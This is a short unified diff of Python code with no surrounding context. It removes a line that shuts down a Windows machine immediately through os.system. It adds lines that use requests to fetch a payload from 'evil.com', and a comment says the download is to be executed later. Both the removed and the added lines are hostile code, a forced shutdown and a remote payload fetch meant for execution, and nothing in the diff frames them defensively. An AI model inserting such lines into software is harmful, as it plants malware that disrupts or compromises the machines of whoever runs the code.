@@ -1,3 +1,3 @@
-    pass  # no-op
-import sys
-sys.modules['os'].system('shutdown /s /t 0')
+import base64
+import requests
+requests.get('http://evil.com/payload')  # just a download, but then exec later
